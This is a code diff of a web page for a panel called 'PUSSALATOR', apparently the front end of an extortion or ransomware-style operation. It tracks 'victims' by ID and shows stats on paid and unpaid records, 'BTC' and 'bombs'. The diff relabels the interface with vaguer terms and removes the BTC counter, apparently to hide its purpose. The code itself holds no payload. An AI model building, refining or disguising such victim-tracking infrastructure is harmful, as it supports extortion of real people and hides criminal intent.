@@ -588,26 +588,41 @@ app.add_middleware(
             box-shadow: 0 0 20px #ff0000;
         }
         
-        .victim-button {
+        .access-button {
             background: black;
             color: #00ff00;
             border: 2px solid #00ff00;
         }
         
-        .victim-button:hover {
+        .access-button:hover {
             background: #00ff00;
             color: black;
         }
         
-        .admin-button {
+        .auth-button {
             background: #000066;
             color: #6666ff;
             border: 2px solid #6666ff;
         }
         
-        .admin-button:hover {
+        .auth-button:hover {
             background: #6666ff;
             color: black;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+        }
+        
+        .input-field {
+            background: black;
+            border: 1px solid #6666ff;
+            color: #6666ff;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            width: 250px;
+            margin: 10px;
         }
         
         .ascii {
@@ -635,28 +650,49 @@ app.add_middleware(
         </div>
         
         <h1>PUSSALATOR</h1>
-        <div class="subtitle">> SYSTEM ACCESS PORTAL <</div>
+        <div class="subtitle">> SYSTEM ACCESS <</div>
+        
+        <div class="input-group">
+            <input type="text" id="access_id" class="input-field" placeholder="ENTER ID">
+            <button class="button auth-button" onclick="submitId()">SUBMIT</button>
+        </div>
         
         <a href="/victim">
-            <button class="button victim-button">🔓 VICTIM ACCESS</button>
+            <button class="button access-button">🔓 VICTIM PORTAL</button>
         </a>
         
-        <a href="/admin/login">
-            <button class="button admin-button">👑 ADMIN LOGIN</button>
-        </a>
-        
-        <div class="stats" id="stats">Loading system statistics...</div>
+        <div class="stats" id="stats">Loading system data...</div>
     </div>
 
     <script>
+        async function submitId() {
+            const id = document.getElementById('access_id').value.trim();
+            if (!id) {
+                alert('Please enter an ID');
+                return;
+            }
+            
+            // Try victim first, then fallback to auth
+            try {
+                const victimRes = await fetch(`/api/victim/${id}`);
+                if (victimRes.status === 200) {
+                    window.location.href = `/victim/${id}`;
+                    return;
+                }
+            } catch(e) {}
+            
+            // Try auth
+            window.location.href = `/auth/${id}`;
+        }
+        
         async function loadStats() {
             try {
                 const r = await fetch('/api/stats');
                 const s = await r.json();
                 document.getElementById('stats').innerHTML = 
-                    `Total Records: ${s.total} | Resolved: ${s.paid} | Pending: ${s.unpaid} | BTC: ${s.btc} | Active Operations: ${s.bombs}`;
+                    `Records: ${s.total} | Completed: ${s.paid} | Pending: ${s.unpaid} | Active: ${s.bombs}`;
             } catch(e) {
-                document.getElementById('stats').innerHTML = 'System statistics temporarily unavailable';
+                document.getElementById('stats').innerHTML = 'System data unavailable';
             }
         }
         
